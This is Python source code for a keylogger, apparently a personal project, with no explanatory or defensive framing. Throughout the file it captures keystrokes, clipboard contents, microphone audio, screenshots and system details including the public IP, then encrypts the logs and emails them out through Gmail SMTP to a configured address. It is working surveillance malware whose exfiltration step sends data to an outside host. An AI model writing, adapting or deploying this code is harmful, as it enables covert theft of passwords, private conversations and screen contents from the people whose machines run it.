import os
import socket
import platform
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from pynput import keyboard
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
import win32clipboard
import sounddevice as sd
from PIL import ImageGrab

# file paths & email configuration
FILE_PATH = "//Users//lydiacharif//KeyLogger//project"
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_email_password"
TO_ADDRESS = "same_email@gmail.com"

KEY_LOG = "key_log.txt"
SYS_INFO = "sys_info.txt"
CLIPBOARD_INFO = "clipboard.txt"
AUDIO_INFO = "audio.wav"
SCREENSHOT_INFO = "screenshot.png"

ENC_KEY_LOG = "e_key_log.txt"
ENC_SYS_INFO = "e_systeminfo.txt"
ENC_CLIPBOARD_INFO = "e_clipboard.txt"

MIC_TIME = 21  # time reco in seconds 
TIME_ITERATION = 25
NUM_ITERATIONS = 2

FILE_MERGE = os.path.join(FILE_PATH, '')

# generate a key for encryption (securely stored)
KEY = Fernet.generate_key()
FERNET = Fernet(KEY)

### function to send email with attachment ###
def send_email(filename, filepath, toaddr):
    try:
        message = MIMEMultipart()
        message["From"] = EMAIL_ADDRESS
        message["To"] = toaddr
        message["Subject"] = "Log File"

        message.attach(MIMEText("Attached log file.", "plain"))

        with open(filepath, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={filename}")
            message.attach(part)

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, toaddr, message.as_string())
    except Exception as e:
        print(f"Error sending email: {e}")

###collect system information ###
def collect_system_info():
    try:
        with open(os.path.join(FILE_PATH, SYS_INFO), "a") as f:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)

            try:
                public_ip = get("https://api.ipify.org").text
                f.write(f"Public IP: {public_ip}\n")
            except Exception:
                f.write("Couldn't get public IP\n")

            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Private IP: {ip_address}\n")
    except Exception as e:
        print(f"Error collecting system info: {e}")

###  copy clipboard data ###
def copy_clipboard():
    try:
        with open(os.path.join(FILE_PATH, CLIPBOARD_INFO), "a") as f:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(f"Clipboard Data:\n{pasted_data}\n")
    except:
        print("Couldn't access clipboard data.")

### record microphone audio ###
def record_audio():
    try:
        fs = 44100
        record = sd.rec(int(MIC_TIME * fs), samplerate=fs, channels=2)
        sd.wait()
        write(os.path.join(FILE_PATH, AUDIO_INFO), fs, record)
    except Exception as e:
        print(f"Error recording audio: {e}")

###  take a screenshot ###
def take_screenshot():
    try:
        image = ImageGrab.grab()
        image.save(os.path.join(FILE_PATH, SCREENSHOT_INFO))
    except Exception as e:
        print(f"Error taking screenshot: {e}")

### Keylogger setup ###
keys = []
def on_press(key):
    global keys
    keys.append(str(key).replace("'", ""))
    if len(keys) >= 10:
        write_keys()
        keys = []

def write_keys():
    try:
        with open(os.path.join(FILE_PATH, KEY_LOG), "a") as f:
            for key in keys:
                if key == "Key.space":
                    f.write("\n")
                elif "Key" not in key:
                    f.write(key)
    except Exception as e:
        print(f"Error writing keylog: {e}")

def on_release(key):
    if key == Key.esc:
        return False

### main execution Loop ###
collect_system_info()
copy_clipboard()
record_audio()
take_screenshot()

iteration = 0
start_time = time.time()

while iteration < NUM_ITERATIONS:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    take_screenshot()
    copy_clipboard()

    send_email(SCREENSHOT_INFO, os.path.join(FILE_PATH, SCREENSHOT_INFO), TO_ADDRESS)

    iteration += 1

    if iteration < NUM_ITERATIONS:
        time.sleep(TIME_ITERATION)

### encrypt and send logs ###
def encrypt_and_send(file, enc_file):
    try:
        with open(file, "rb") as f:
            data = f.read()

        encrypted_data = FERNET.encrypt(data)

        with open(enc_file, "wb") as f:
            f.write(encrypted_data)

        send_email(os.path.basename(enc_file), enc_file, TO_ADDRESS)
    except Exception as e:
        print(f"Error encrypting {file}: {e}")

files_to_encrypt = {
    os.path.join(FILE_PATH, SYS_INFO): os.path.join(FILE_PATH, ENC_SYS_INFO),
    os.path.join(FILE_PATH, CLIPBOARD_INFO): os.path.join(FILE_PATH, ENC_CLIPBOARD_INFO),
    os.path.join(FILE_PATH, KEY_LOG): os.path.join(FILE_PATH, ENC_KEY_LOG),
}

for file, enc_file in files_to_encrypt.items():
    encrypt_and_send(file, enc_file)

print("Process complete.")
time.sleep(160)


